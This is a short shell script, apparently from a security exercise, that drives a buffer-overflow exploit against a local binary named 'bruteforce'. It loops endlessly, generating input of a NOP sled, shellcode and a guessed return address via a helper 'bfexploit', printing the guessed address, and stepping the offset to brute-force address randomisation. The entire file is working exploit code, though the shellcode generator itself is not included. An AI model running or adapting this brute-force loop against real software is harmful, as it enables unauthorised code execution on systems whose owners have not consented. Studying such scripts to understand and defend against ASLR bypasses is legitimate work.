#!/bin/sh

while [ 0 ]; do
    # Calculate input (NOP sled + shellcode + address) to the vulnerable executable
    input="$(./bfexploit 4096 $i)"
    # Output the pseudo-random address which is used for the overflow
    echo $input | hexdump -s 4096 -n 4 -v -e '/4 "%02x "'
    # Try the exploit
    ./bruteforce "$input"
    # Update address offset
    i=$(($i + 2048))
    if [ $i -gt 16777216 ]; then
        i=0
    fi
done
